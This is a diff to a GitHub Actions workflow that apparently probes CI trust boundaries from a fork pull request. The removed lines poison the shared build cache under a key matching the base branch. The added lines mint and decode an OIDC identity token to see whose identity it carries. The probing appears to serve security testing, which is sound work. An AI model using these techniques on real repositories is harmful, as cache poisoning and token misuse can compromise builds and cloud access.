@@ -1,12 +1,20 @@
 name: cache-trust
 on: { pull_request: {} }
+permissions:
+  id-token: write
+  contents: read
 jobs:
-  poison:
+  oidc:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "POISONED-BY-FORK-DEPTEST" > ./artifact.txt
-      - name: write poisoned cache (key build- prefix to match base restore-keys)
-        uses: actions/cache@v4
-        with:
-          path: ./artifact.txt
-          key: build-main-v1
+      - name: mint + decode OIDC token (sub = fork identity or BASE identity?)
+        run: |
+          echo "REQ_URL_present=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=crosstrust-test" | python3 -c "import sys,json;print(json.load(sys.stdin).get(\"value\",\"NONE\"))")
+            echo "OIDC_CLAIMS_BEGIN"
+            python3 -c "import base64,json; p=\"$T\".split(\".\")[1]; print(json.dumps(json.loads(base64.urlsafe_b64decode(p+\"==\"))))" 2>/dev/null || echo "decode-failed token=${T:0:12}"
+            echo "OIDC_CLAIMS_END"
+          else
+            echo "NO id-token:write granted to this (fork PR) run"
+          fi
